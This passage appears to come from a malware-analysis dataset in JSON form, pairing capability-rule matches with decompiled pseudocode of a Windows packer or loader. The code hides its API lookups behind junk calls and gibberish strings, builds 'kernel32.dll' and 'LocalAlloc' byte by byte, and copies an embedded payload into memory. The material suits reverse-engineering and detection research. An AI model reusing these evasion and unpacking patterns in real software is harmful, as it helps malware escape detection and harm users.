= 0x9027277c;\n            uStackY9356 = *0x6275590;\n        }\n        *0x626db88 = 0;\n        *0x626db8c = 0;\n        var_156ch = 2;\n        var_91h = var_91h << 2;\n        *0x626b0f4 = 0x95c60404;\n        var_15b4h = *0x626b0f4;\n        var_158ch = *0x626db88;\n        if (*0x6274304 == 0xdd7) {\n            var_10h = NULL;\n            var_14h = 0x429118;\n            (*_sym.imp.ADVAPI32.dll_ImpersonateNamedPipeClient)();\n            *0x8f9e70 = 0;\n            *0x8f9e74 = 0;\n            uStackY9360 = *0x8f9e70;\n        }\n        var_1568h = 0;\n        *0x627430c = 0;\n        var_1564h = 0xc0;\n        var_91h = var_91h & 0xc0;\n        *0x90211c = 0;\n        var_15ach = *0x90211c;\n        if (*0x6274304 == 0xeb8) {\n            var_10h = NULL;\n            var_14h = 0x429276;\n            (*_sym.imp.GDI32.dll_GetArcDirection)();\n            var_14h = NULL;\n            var_18h = L\"Bore gepujapanuyuci yezibelasisidi yasenovafoce gofuzateketetu\";\n            var_1ch = NULL;\n            var_20h = L\"Hizejitozevi ku nayekeba ponozekofixo lufinasazive\";\n            var_24h = NULL;\n            var_28h = NULL;\n            var_2ch = 0x42928e;\n            (*_sym.imp.KERNEL32.DLL_CompareStringW)();\n            *0x626dbac = 0xdbaca03a;\n            uStackY9364 = *0x626dbac;\n        }\n        *0x902028 = 0;\n        *0x90202c = 0;\n        var_a9h = var_a9h | var_91h;\n        *0x626b160 = 0;\n        if (*0x6274304 == 0xa62) {\n            *0x6275578 = 0xc85ef058;\n            *0x627557c = 0xffffffff;\n            uStackY9368 = *0x6275578;\n        }\n        *0x626b1ec = 0xb8be42b8;\n        var_91h = var_59h;\n        *0x626b124 = 0xaaa22fc4;\n        var_15a8h = *0x626b160;\n        var_1558h = *0x902028;\n        var_1554h = *0x626b1ec;\n        var_153ch = *0x626b124;\n        if (*0x6274304 == 0xeae) {\n            var_10h = NULL;\n            var_14h = 0x4294ec;\n            (*_sym.imp.GDI32.dll_DeleteMetaFile)();\n            *0x9050e8 = 0;\n            uStackY9372 = *0x9050e8;\n        }\n        *0x902150 = 0xc2789b2e;\n        var_1550h = 4;\n        *0x626b12c = 0;\n        if (*0x6274304 == 0x10dd) {\n            *0x626b100 = 0xe309d7aa;\n            uStackY9376 = *0x626b100;\n        }\n        *0x6274310 = 0;\n        var_1538h = 0xc0;\n        var_91h = (var_91h & 0xc) << 4;\n        var_15a4h = 0;\n        *0x901fe4 = 0;\n        *0x901fe0 = 0;\n        if (*0x6274304 == 0xffd) {\n            *0x902140 = 0xd6578524;\n            uStackY9380 = *0x902140;\n        }\n        *0x8ffda8 = 0x8ed42b1e;\n        *0x8ffdac = 0xffffffff;\n        uStackY72 = uStackY72 & 0xffffff | (uStackY72._3_1_ | var_91h) << 0x18;\n        *0x627431c = 0xd6bd8ad2;\n        var_15b0h = *0x626b12c;\n        var_1560h = *0x8ffda8;\n        var_1520h = *0x6274310;\n        var_151ch = *0x627431c;\n        var_1510h = *0x902150;\n        if (*0x6274304 == 0xd4d) {\n            var_10h = NULL;\n            var_14h = NULL;\n            var_18h = L\"Xisivofebu pucawejiti\";\n            var_1ch = L\"Xajiheheguva\";\n            var_20h = 0x4299bc;\n            (*_sym.imp.KERNEL32.DLL_SetFirmwareEnvironmentVariableW)();\n            *0x9050f8 = 0xb527ba80;\n            *0x9050fc = 0xffffffff;\n            uStackY9384 = *0x9050f8;\n        }\n        *0x626db34 = 0;\n        var_91h = var_59h;\n        *0x8ffd70 = 0;\n        var_15bch = *0x626db34;\n        var_1518h = *0x8ffd70;\n        if (*0x6274304 == 0x11f6) {\n            var_10h = &stack0xffffdb4c;\n            var_14h = NULL;\n            var_18h = NULL;\n            var_1ch = 0x429b12;\n            (*_sym.imp.GDI32.dll_GetKerningPairsA)();\n            var_1ch = NULL;\n            var_20h = NULL;\n            var_24h = 0x429b1c;\n            (*_sym.imp.KERNEL32.DLL_SetCommState)();\n            var_24h = 0x429b22;\n            (*_sym.imp.USER32.dll_CreatePopupMenu)();\n            *0x8ff92c = 0xadf21476;\n            uStackY9388 = *0x8ff92c;\n        }\n        *0x626b128 = 0xc66024f0;\n        var_1584h = 6;\n        var_91h = var_91h << 6;\n        *0x626db5c = 0;\n        var_15a0h = *0x626db5c;\n        var_1588h = *0x626b128;\n        if (*0x6274304 == 0x1063) {\n            var_10h = NULL;\n            var_14h = NULL;\n            var_18h = NULL;\n            var_1ch = 0x429cc0;\n            (*_sym.imp.USER32.dll_SetWindowLongW)();\n            var_1ch = NULL;\n            var_20h = L\"Johezinu\";\n            var_24h = L\"Digogarerogo ximicacefa\";\n            var_28h = L\"Zapoju vegecu pakukixi\";\n            var_2ch = 0x429cd7;\n            (*_sym.imp.GDI32.dll_CreateICW)();\n            var_2ch = &stack0xffffdb3c;\n            var_30h = NULL;\n            var_34h = 0x429ce6;\n            (*_sym.imp.USER32.dll_DrawFocusRect)();\n            *0x8ffd6c = 0xe5137f3a;\n            uStackY9416 = *0x8ffd6c;\n        }\n        *0x902660 = 0xf70b5ac2;\n        var_1580h = 0xc0;\n        var_91h = var_91h & 0xc0;\n        *0x8f9e84 = 0;\n        var_157ch = *0x8f9e84;\n        var_1544h = *0x902660;\n        if (*0x6274304 == 0x797) {\n            var_10h = NULL;\n            var_14h = 0x429eb9;\n            (*_sym.imp.KERNEL32.DLL_LocalFree)();\n            *0x90208c = 0;\n            uStackY9420 = *0x90208c;\n        }\n        *0x9020d8 = 0xb187451a;\n        *0x9020dc = 0xffffffff;\n        var_71h = var_71h | var_91h;\n        *0x626b198 = 0xc3152662;\n        *0x626b19c = 0xffffffff;\n        var_1578h = *0x9020d8;\n        var_1534h = *0x626b198;\n        if (*0x6274304 == 0x2e6) {\n            var_10h = NULL;\n            var_14h = NULL;\n            var_18h = 0x42a026;\n            (*_sym.imp.GDI32.dll_SetICMProfileW)();\n            var_18h = NULL;\n            var_1ch = 0x42a02e;\n            (*_sym.imp.GDI32.dll_CreateFontIndirectA)();\n            var_1ch = NULL;\n            var_20h = L\"Fofecibumo fonejoya pocijatimovupa mito\";\n            var_24h = L\"Besusipobo jetakunabexuzo nofemarapiwa binuyojo yereyo\";\n            var_28h = 0x42a040;\n            (*_sym.imp.KERNEL32.DLL_CreateDirectoryExA)();\n            *0x902014 = 0xe295f1c0;\n            uStackY9424 = *0x902014;\n        }\n        var_15dch = 0;\n        *0x902064 = var_15dch;\n        *(var_40h + var_34h) = var_a9h;\n        *0x9020e8 = 0;\n        var_159ch = *0x9020e8;\n        if (*0x6274304 == 0xaa) {\n            var_10h = NULL;\n            var_14h = &stack0xffffd72c;\n            var_18h = NULL;\n            var_1ch = 0x42a163;\n            (*_sym.imp.USER32.dll_GetClassNameA)();\n            *0x905124 = 0xaf0eef1a;\n            uStackY9428 = *0x905124;\n        }\n        *0x626db78 = 0;\n        *0x626db7c = 0;\n        var_34h = var_34h + 1;\n        *0x6274308 = 0;\n        var_15d8h = *0x626db78;\n        var_1574h = *0x6274308;\n        if (*0x6274304 == 0x1219) {\n            var_10h = &stack0xffffd728;\n            var_14h = NULL;\n            var_18h = NULL;\n            var_1ch = 0x42a279;\n            (*_sym.imp.ole32.dll_CreateGenericComposite)();\n            *0x9020a0 = 0;\n            uStackY10460 = *0x9020a0;\n        }\n        var_1540h = 0xcf9ca752;\n        *0x902024 = var_1540h;\n        *(var_40h + var_34h) = uStackY72._3_1_;\n        *0x626b578 = 0;\n        var_152ch = *0x626b578;\n        if (*0x6274304 == 0x1051) {\n            var_10h = \"Cawibeji yesozizugiku sizopebociwane cekuxevi pihanegu\";\n            var_14h = \"Tohuvatabere hosunesilu faburu huyelagi\";\n            var_18h = NULL;\n            var_1ch = NULL;\n            var_20h = 0x42a3ff;\n            (*_sym.imp.USER32.dll_FindWindowExA)();\n            var_20h = NULL;\n            var_24h = NULL;\n            var_28h = NULL;\n            var_2ch = NULL;\n            var_30h = 0x42a40d;\n            (*_sym.imp.KERNEL32.DLL_EnumCalendarInfoW)();\n            *0x626aa0c = 0xa4bb27ce;\n            uStackY10464 = *0x626aa0c;\n        }\n        *0x8f9e44 = 0xdbe44c94;\n        var_34h = var_34h + 1;\n        *0x902610 = 0xd8ce5998;\n        *0x902614 = 0xffffffff;\n        var_15d0h = *0x8f9e44;\n        var_15b8h = *0x902610;\n        if (*0x6274304 == 0x103b) {\n            var_10h = NULL;\n            var_14h = &stack0xffffd704;\n            var_18h = NULL;\n            var_1ch = 0x42a585;\n            (*_sym.imp.GDI32.dll_GetTextCharsetInfo)();\n            *0x6275574 = 0x93756a5c;\n            uStackY10468 = *0x6275574;\n        }\n        var_1528h = 0;\n        *0x626b1a4 = var_1528h;\n        *(var_40h + var_34h) = var_71h;\n        *0x902058 = 0;\n        var_1594h = *0x902058;\n        if (*0x6274304 == 0x1311) {\n            var_10h = NULL;\n            var_14h = NULL;\n            var_18h = 0x42a655;\n            (*_sym.imp.USER32.dll_SetMenuContextHelpId)();\n            *0x902078 = 0;\n            uStackY10496 = *0x902078;\n        }\n        *0x9020bc = 0xb9d898bc;\n        var_34h = var_34h + 1;\n        *0x6275588 = 0;\n        var_1570h = *0x6275588;\n        var_154ch = *0x9020bc;\n        if (*0x6274304 == 0x10b6) {\n            var_10h = NULL;\n            var_14h = NULL;\n            var_18h = 0x42a788;\n            (*_sym.imp.KERNEL32.DLL_FreeLibraryAndExitThread)();\n            var_18h = NULL;\n            var_1ch = NULL;\n            var_20h = 0x42a792;\n            (*_sym.imp.USER32.dll_SetClipboardData)();\n            var_20h = &stack0xffffd6d4;\n            var_24h = NULL;\n            var_28h = 0x42a7a1;\n            (*_sym.imp.GDI32.dll_ChoosePixelFormat)();\n            *0x626b068 = 0;\n            uStackY10500 = *0x626b068;\n        }\n        *0x902098 = 0;\n        *0x90209c = 0;\n        var_1514h = *0x902098;\n    }\n    *0x902010 = 0x94a087f2;\n    var_20h = *0x902010;\n    if (*0x6274304 == 0x95a) {\n        var_10h = NULL;\n        var_14h = NULL;\n        var_18h = NULL;\n        var_1ch = 0x42a949;\n        (*_sym.imp.KERNEL32.DLL_EnumTimeFormatsW)();\n        uStackY10556 = 0;\n        uStackY10552 = 0;\n        var_1ch = &stack0xffffd6d0;\n        var_20h = &stack0xffffd6c4;\n        var_24h = 0x42a971;\n        (*_sym.imp.KERNEL32.DLL_InterlockedPushEntrySList)();\n        var_24h = NULL;\n        var_28h = NULL;\n        var_2ch = NULL;\n        var_30h = 0x42a97d;\n        (*_sym.imp.GDI32.dll_PolyBezier)();\n        var_30h = NULL;\n        var_34h = 0;\n        var_38h = 0;\n        var_3ch = 0;\n        var_40h = 0;\n        uStackY72 = 0;\n        var_48h = 0x42a98f;\n        (*_sym.imp.KERNEL32.DLL_SetTimerQueueTimer)();\n        *0x626b190 = 0x97d9dbac;\n        *0x626b194 = 0xffffffff;\n        uStackY10560 = *0x626b190;\n    }\n    var_50h = 0;\n    *0x9025dc = var_50h;\n    *arg_8h = var_40h;\n    *0x902134 = 0xc9274a14;\n    var_78h = *0x902134;\n    if (*0x6274304 == 0xdb7) {\n        var_10h = NULL;\n        var_14h = NULL;\n        var_18h = &stack0xffffd6b0;\n        var_1ch = NULL;\n        var_20h = NULL;\n        var_24h = 0x42aaa7;\n        (*_sym.imp.USER32.dll_TileWindows)();\n        *0x626b174 = 0xe2cc8772;\n        uStackY10580 = *0x626b174;\n    }\n    var_a0h = 0;\n    *0x627558c = var_a0h;\n    *arg_ch = var_34h;\n    *0x9020fc = 0x984c796c;\n    var_2ch = *0x9020fc;\n    if (*0x6274304 == 0x10fd) {\n        var_10h = NULL;\n        var_14h = 0x42abbe;\n        (*_sym.imp.KERNEL32.DLL_GlobalUnfix)();\n        var_14h = NULL;\n        var_18h = &stack0xffffcea4;\n        var_1ch = L\"Wuza yeva\";\n        var_20h = 0x42abd2;\n        (*_sym.imp.KERNEL32.DLL_GetShortPathNameW)();\n        var_20h = NULL;\n        var_24h = 0x42abda;\n        (*_sym.imp.KERNEL32.DLL_ConvertDefaultLocale)();\n        var_24h = L\"Weyoyo digidaxideko\";\n        var_28h = L\"Jameba povoluza soripetute\";\n        var_2ch = 0x42abea;\n        (*_sym.imp.ADVAPI32.dll_OpenBackupEventLogA)();\n        *0x902038 = 0xa4de278e;\n        *0x90203c = 0xffffffff;\n        uStackY10584 = *0x902038;\n    }\n    *0x902638 = 0;\n    var_ch = 0x42acaf;\n    var_60h = *0x902638;\n    fcn.004034d8(var_8h);\n    return;\n}\n",
        "token_count": 9952
    },
    "0042b670": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.0042b670(void)\n\n{\n    int32_t iVar1;\n    char *unaff_EBX;\n    uchar auStackY12120 [28];\n    uchar auStackY12092 [16];\n    uint uStackY12076;\n    uchar auStackY12072 [4];\n    char16_t acStackY12068 [8];\n    uint uStackY12052;\n    uchar auStackY12048 [4];\n    uchar auStackY12044 [4];\n    uint uStackY12040;\n    uint uStackY12036;\n    uint uStackY12032;\n    uint uStackY12028;\n    uint uStackY12024;\n    int32_t iStackY12020;\n    uint uStackY12016;\n    uchar auStackY12012 [4];\n    uchar auStackY12008 [16];\n    uint uStackY11992;\n    uchar uStackY11985;\n    uint uStackY11984;\n    uint uStackY11980;\n    uint uStackY11976;\n    uint uStackY11972;\n    int32_t iStackY11968;\n    uint uStackY11964;\n    uint uStackY11960;\n    uchar auStackY11956 [2048];\n    uchar auStackY9908 [2052];\n    uint var_1each;\n    uint var_1ea8h;\n    uint var_1ea4h;\n    uint var_1ea0h;\n    uint32_t var_1e9ch;\n    uint var_1e98h;\n    uint ExtensionUuid;\n    uint var_1e78h;\n    uint var_1e74h;\n    uint var_1e70h;\n    uint var_1e6ch;\n    uint var_1e68h;\n    uint var_1e64h;\n    int32_t var_1e60h;\n    uint pActCtx;\n    uint var_1e3ch;\n    uint lpsz;\n    uint var_1a34h;\n    uint var_1a30h;\n    uint var_1a2ch;\n    uint var_1a28h;\n    uint var_1a24h;\n    uint var_1a20h;\n    int32_t var_1a1ch;\n    uint var_1a18h;\n    uint var_1a14h;\n    uint var_1a10h;\n    uint var_1a0ch;\n    uint var_1a08h;\n    uint var_1604h;\n    uint var_1600h;\n    uint var_e00h;\n    uint var_df8h;\n    uint var_df4h;\n    uint lpBuffer;\n    uint var_dd0h;\n    int32_t var_dcch;\n    uint var_da8h;\n    uint var_da4h;\n    uint var_da0h;\n    uint var_d9ch;\n    uint var_d98h;\n    uint lpTimeAdjustmentDisabled;\n    uint var_d90h;\n    int32_t lpTimeIncrement;\n    uint var_d88h;\n    uint var_d84h;\n    uint var_d80h;\n    int32_t var_d7ch;\n    uint lpTimeAdjustment;\n    int32_t var_d60h;\n    uint var_d5ch;\n    uint lphActCtx;\n    uint var_d54h;\n    uint var_d50h;\n    uint var_d4ch;\n    uint var_d48h;\n    uint var_d30h;\n    uint var_d2ch;\n    uint var_d28h;\n    uint var_d24h;\n    uint var_d20h;\n    uint var_51ch;\n    uint var_500h;\n    uint var_4fch;\n    uint var_4f8h;\n    uint var_4f4h;\n    uint var_4f0h;\n    uint var_4d4h;\n    uint var_4d0h;\n    uint32_t var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint *var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint *var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uchar *var_50h;\n    uint var_4ch;\n    char16_t *var_48h;\n    char16_t *var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    code *var_34h;\n    code *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    char16_t *var_20h;\n    char *var_1ch;\n    char *var_18h;\n    char *var_14h;\n    char16_t *var_10h;\n    uint *var_ch;\n    uchar *var_8h;\n    char *var_4h;\n    \n    var_4h = 0x42b67d;\n    fcn.00421280();\n    var_d0h = *0x4380e0 ^ &stack0xfffffffc;\n    var_8h = 0x626dbb0;\n    var_ch = 0x42b696;\n    var_4h = unaff_EBX;\n    iVar1 = (*_sym.imp.KERNEL32.DLL_lstrlenW)();\n    if (iVar1 == 0x4ef4) {\n        var_ch = NULL;\n        var_10h = 0x42b6a9;\n        (*_sym.imp.ADVAPI32.dll_AbortSystemShutdownW)();\n        var_10h = NULL;\n        var_14h = 0x42b6b1;\n        (*_sym.imp.ADVAPI32.dll_IsValidSid)();\n        var_4d4h = 0;\n        var_14h = NULL;\n        var_18h = NULL;\n        var_1ch = NULL;\n        var_20h = &fcn.0042b670::var_4d4h;\n        var_24h = NULL;\n        var_28h = NULL;\n        var_2ch = 0x42b6d2;\n        (*_sym.imp.ADVAPI32.dll_CreatePrivateObjectSecurity)();\n        var_2ch = &fcn.0042b670::var_d28h;\n        var_30h = var_4fch;\n        var_34h = NULL;\n        var_38h = 0;\n        var_3ch = 0;\n        var_40h = 0;\n        var_44h = 0x42b6ee;\n        (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)();\n        var_44h = &fcn.0042b670::var_4d0h;\n        var_48h = NULL;\n        var_4ch = 0;\n        var_50h = 0x42b6ff;\n        (*_sym.imp.GDI32.dll_GetObjectA)();\n        var_50h = NULL;\n        var_54h = 0;\n        var_58h = 0x42b709;\n        (*_sym.imp.KERNEL32.DLL_SetConsoleMode)();\n        var_58h = 0;\n        var_5ch = 0;\n        var_60h = 0;\n        var_64h = 0x42b715;\n        (*_sym.imp.USER32.dll_CharNextExA)();\n        var_64h = 0;\n        var_68h = 0;\n        var_6ch = 0x42b71f;\n        (*_sym.imp.USER32.dll_LoadKeyboardLayoutA)();\n        var_6ch = &fcn.0042b670::var_4f0h;\n        var_70h = 0;\n        var_74h = 0x42b72e;\n        (*_sym.imp.USER32.dll_IsDialogMessageA)();\n        var_74h = &fcn.0042b670::var_51ch;\n        var_78h = 0;\n        var_7ch = 0x42b73d;\n        (*_sym.imp.USER32.dll_IsDialogMessageW)();\n        var_7ch = 0;\n        var_80h = &fcn.0042b670::var_d20h;\n        var_84h = 0;\n        var_88h = 0x42b74e;\n        (*_sym.imp.USER32.dll_GetKeyNameTextW)();\n        *0x8ffdb8 = 0;\n        var_d30h = *0x8ffdb8;\n        if (*0x6274304 == 0x474) {\n            var_4h = NULL;\n            var_8h = NULL;\n            var_ch = NULL;\n            var_10h = NULL;\n            var_14h = 0x42b7d2;\n            (*_sym.imp.GDI32.dll_PlayMetaFileRecord)();\n            *0x902008 = 0xc6fb015e;\n            var_d4ch = *0x902008;\n        }\n        *0x8ff928 = 0x9bff657e;\n        *0x905140 = 0;\n        if (*0x6274304 == 0x986) {\n            *0x626b090 = 0xa53c073a;\n            var_d50h = *0x626b090;\n        }\n        *0x626b0dc = 0;\n        *0x626b588 = 0;\n        *0x626b58c = 0;\n        var_d2ch = *0x8ff928;\n        var_500h = *0x626b588;\n        var_4f8h = *0x626b0dc;\n        var_4f4h = *0x905140;\n        if (*0x6274304 == 0x3ca) {\n            var_4h = \"Pucisohapu baxutawegise sexo zuhorebofiso\";\n            var_8h = NULL;\n            var_ch = NULL;\n            var_10h = 0x42ba27;\n            (*_sym.imp.KERNEL32.DLL_OpenWaitableTimerA)();\n            var_10h = NULL;\n            var_14h = &fcn.0042b670::var_d5ch;\n            var_18h = 0x42ba36;\n            (*_sym.imp.KERNEL32.DLL_InterlockedExchangeAdd)();\n            var_18h = NULL;\n            var_1ch = NULL;\n            var_20h = 0x42ba40;\n            (*_sym.imp.ole32.dll_CoLoadLibrary)();\n            lphActCtx = 0;\n            var_20h = &fcn.0042b670::lphActCtx;\n            var_24h = 0x42ba57;\n            (*_sym.imp.KERNEL32.DLL_GetCurrentActCtx)();\n            *0x8ffda0 = 0x9d976578;\n            var_d54h = *0x8ffda0;\n        }\n        *0x905110 = 0x86a1689c;\n        var_4h = 0x6e;\n        var_ch = 0x2c294c44;\n        var_8h = 0x41cdb892;\n        var_10h = L\"Nakejijalowixa sesovubuniziyigo\";\n        var_14h = \"%s %f %c\";\n        var_18h = 0x42bb09;\n        var_d24h = *0x905110;\n        fcn.004039be(\"%s %f %c\", \"Nakejijalowixa sesovubuniziyigo\");\n        var_4h = 0x42bb17;\n        fcn.004014a0();\n        var_4h = \n        \"Suzomihece raliwadenahuhoduta cufacudohoje nopewesewokiwodeyu hezuno divuceguvoziniruha ludicowijogopuzuta xedugo ditaho fi\"\n        ;\n        var_8h = 0x42bb27;\n        fcn.004013c0(\n                    \"Suzomihece raliwadenahuhoduta cufacudohoje nopewesewokiwodeyu hezuno divuceguvoziniruha ludicowijogopuzuta xedugo ditaho fi\"\n                    );\n        var_8h = &stack0xffffd0a8;\n        var_ch = 0x42bb39;\n        fcn.00401510(var_8h);\n        var_ch = 0x42bb44;\n        fcn.00401440();\n        var_ch = 0x42bb4f;\n        fcn.004014f0();\n        var_10h = 0xed916873;\n        var_ch = 0x3fdd3f7c;\n        var_14h = 0x42bb66;\n        fcn.00403b40();\n        var_ch = 0x42bb76;\n        fcn.004014d0();\n    }\n    var_d60h = 0;\n    do {\n        if (0x11de5c1f < var_d60h) {\ncode_r0x0042c2c2:\n            *0x6274304 = *0x8f87f0;\n            for (var_1a1ch = 0; var_1a1ch < 0x64c111; var_1a1ch = var_1a1ch + 1) {\n                *0x626b188 = 0xb4a33a36;\n                var_1a28h = *0x626b188;\n                if (*0x6274304 == 0xf7c) {\n                    var_ch = &fcn.0042b670::var_1a34h;\n                    var_10h = L\"Nilepijozolopi yizoguserone\";\n                    var_14h = NULL;\n                    var_18h = 0x42c39d;\n                    (*_sym.imp.KERNEL32.DLL_GetModuleHandleExW)();\n                    var_18h = \"Rarute cogedezo cisina kacosa\";\n                    var_1ch = 0x42c3a8;\n                    (*_sym.imp.GDI32.dll_RemoveFontResourceA)();\n                    *0x626b1a8 = 0;\n                    *0x626b1ac = 0;\n                    var_1a30h = *0x626b1a8;\n                }\n                *0x626db84 = 0xed7fe2a4;\n                if (var_1a1ch == 0x3d8ded) {\n                    *0x6274304 = *0x6274304 + 0xba22;\n                }\n                *0x901fd8 = 0;\n                *0x901fdc = 0;\n                var_1a2ch = *0x901fd8;\n                var_1a20h = *0x626db84;\n                if (*0x6274304 == 0x1329) {\n                    var_ch = &fcn.0042b670::lpsz;\n                    var_10h = 0x42c57d;\n                    (*_sym.imp.USER32.dll_CharLowerA)();\n                    var_10h = &fcn.0042b670::pActCtx;\n                    var_14h = 0x42c58a;\n                    (*_sym.imp.KERNEL32.DLL_CreateActCtxW)();\n                    *0x8f9e50 = 0;\n                    var_1e3ch = *0x8f9e50;\n                }\n                *0x626b0f8 = 0;\n                *0x626b0fc = 0;\n                var_1a24h = *0x626b0f8;\n            }\n            *0x8ffde5 = 0x6c;\n            *0x9025bc = 0x88f4aba8;\n            *0x8ffde7 = 0x32;\n            *0x902040 = 0;\n            *0x8ffde4 = 0x65;\n            *0x8f9e68 = 0xdc6d2e62;\n            *0x8f9e6c = 0xffffffff;\n            *0x8ffdeb = 0x6c;\n            *0x902600 = 0;\n            *0x902604 = 0;\n            *0x8ffde1 = 0x65;\n            *0x8ffda4 = 0;\n            *0x8ffde6 = 0x33;\n            *0x902104 = 0xcdbb790e;\n            *0x8ffde3 = 0x6e;\n            *0x905114 = 0xddb38a9e;\n            *0x8ffde2 = 0x72;\n            *0x626b0b0 = 0;\n            *0x626b0b4 = 0;\n            *0x8ffde0 = 0x6b;\n            *0x626b094 = NULL;\n            *0x8ffdea = 0x6c;\n            *0x902148 = 0xcfa335cc;\n            *0x90214c = 0xffffffff;\n            *0x8ffde8 = 0x2e;\n            *0x9050ec = 0;\n            *0x8ffde9 = 100;\n            *0x8ffd68 = 0;\n            *0x8ffdec = 0;\n            var_ch = 0x8ffde0;\n            var_10h = 0x42cafe;\n            var_cch = *0x9050ec;\n            var_b4h = *0x8ffda4;\n            var_a4h = *0x902040;\n            var_a0h = *0x902600;\n            var_8ch = *0x8f9e68;\n            var_78h = *0x902104;\n            var_68h = *0x9025bc;\n            var_5ch = *0x905114;\n            var_58h = *0x626b0b0;\n            var_44h = *0x626b094;\n            var_40h = *0x902148;\n            var_3ch = *0x8ffd68;\n            *0x626db2c = (*_sym.imp.KERNEL32.DLL_GetModuleHandleA)();\n            *0x902668 = 0x4c;\n            *0x90263c = 0;\n            *0x902671 = 99;\n            *0x626b0bc = 0;\n            *0x90266b = 0x61;\n            *0x8ffd78 = 0x96333e68;\n            *0x8ffd7c = 0xffffffff;\n            *0x90266e = 0x6c;\n            *0x626b104 = 0xc84d35c6;\n            *0x90266f = 0x6c;\n            *0x626b570 = 0xd6458e18;\n            *0x90266c = 0x6c;\n            *0x626b164 = 0;\n            *0x902669 = 0x6f;\n            *0x626db9c = 0x8b1d584e;\n            *0x90266a = 99;\n            *0x902080 = 0;\n            *0x902670 = 0x6f;\n            *0x9050f0 = NULL;\n            *0x90266d = 0x41;\n            *0x902620 = 0;\n            *0x902672 = 0;\n            var_c8h = *0x90263c;\n            var_c4h = *0x626b164;\n            var_c0h = *0x902080;\n            var_9ch = *0x8ffd78;\n            var_98h = *0x626b104;\n            var_94h = *0x626b570;\n            var_54h = *0x626b0bc;\n            var_50h = *0x9050f0;\n            var_38h = *0x902620;\n            var_20h = *0x626db9c;\n            for (var_1e60h = 0; var_1e60h < 0x5ced96; var_1e60h = var_1e60h + 1) {\n                *0x626b148 = 0xc44d175c;\n                *0x626b14c = 0xffffffff;\n                var_1e6ch = *0x626b148;\n                if (*0x6274304 == 0x4c5) {\n                    var_10h = NULL;\n                    var_14h = NULL;\n                    var_18h = 0x42d023;\n                    (*_sym.imp.ADVAPI32.dll_EqualPrefixSid)();\n                    var_18h = 0x42d029;\n                    (*_sym.imp.ole32.dll_CoSuspendClassObjects)();\n                    *0x626b574 = 0xefbb2000;\n                    var_1e74h = *0x626b574;\n                }\n                *0x9025f8 = 0;\n                *0x9025fc = 0;\n                var_1e70h = *0x9025f8;\n                if (var_1e60h == 0x197f4b) {\n                    var_10h = 0x902668;\n                    var_14h = *0x626db2c;\n                    var_18h = 0x42d10d;\n                    *0x626b1e8 = (*_sym.imp.KERNEL32.DLL_GetProcAddress)();\n                }\n                *0x626b078 = 0x952bfeca;\n                var_1e64h = *0x626b078;\n                if (*0x6274304 == 0xeeb) {\n                    var_10h = &fcn.0042b670::var_1e98h;\n                    var_14h = NULL;\n                    var_18h = 0x42d1c2;\n                    (*_sym.imp.USER32.dll_GetClientRect)();\n                    var_18h = NULL;\n                    var_1ch = &fcn.0042b670::ExtensionUuid;\n                    var_20h = 0x42d1d1;\n                    (*_sym.imp.ole32.dll_CoRegisterChannelHook)();\n                    var_1e78h = 0;\n                    *0x626b0e8 = 0;\n                    *0x626b0ec = 0;\n                }\n                *0x626b140 = 0;\n                *0x626b144 = 0;\n                var_1e68h = *0x626b140;\n            }\n            var_10h = *0x6274304;\n            var_14h = NULL;\n            var_18h = 0x42d25b;\n            *0x90264c = (**0x626b1e8)();\n            *0x6274318 = *0x439488;\n            for (var_1e9ch = 0; var_1e9ch < *0x6274304; var_1e9ch = var_1e9ch + 1) {\n                *0x626b0cc = 0xaf4dc1f0;\n                var_1each = *0x626b0cc;\n                if (*0x6274304 == 0x33e) {\n                    var_18h = NULL;\n                    var_1ch = &stack0xffffd94c;\n                    var_20h = 0x42d2e4;\n                    (*_sym.imp.KERNEL32.DLL_FindFirstVolumeW)();\n                    var_20h = L\"Koyoza bine rana\";\n                    var_24h = NULL;\n                    var_28h = &stack0xffffd14c;\n                    var_2ch = 0x42d2f8;\n                    (*_sym.imp.KERNEL32.DLL_GetPrivateProfileSectionNamesW)();\n                    *0x8ffd90 = 0xd6cf129a;\n                    uStackY11960 = *0x8ffd90;\n                }\n                var_1ea0h = 0xaee3e122;\n                *0x902628 = var_1ea0h;\n                (*0x90264c)[var_1e9ch] = *(*0x6274318 + var_1e9ch + 0xba22);\n                *0x90262c = 0xf0136f06;\n                var_1ea8h = *0x90262c;\n                if (*0x6274304 == 0x934) {\n                    var_18h = NULL;\n                    var_1ch = \"Xajevirihile\";\n                    var_20h = 0x42d463;\n                    (*_sym.imp.USER32.dll_LoadKeyboardLayoutA)();\n                    var_20h = NULL;\n                    var_24h = NULL;\n                    var_28h = NULL;\n                    var_2ch = 0x42d46f;\n                    (*_sym.imp.KERNEL32.DLL_AddConsoleAliasA)();\n                    *0x626db80 = 0xd5bf4f24;\n                    uStackY11964 = *0x626db80;\n                }\n                *0x626b1e0 = 0xc8bc34a4;\n                *0x626b1e4 = 0xffffffff;\n                var_1ea4h = *0x626b1e0;\n            }\n            var_18h = 0x6274304;\n            var_1ch = 0x90264c;\n            var_20h = 0x42d5b7;\n            fcn.00427750(0x90264c, 0x6274304);\n            var_74h = 0x40;\n            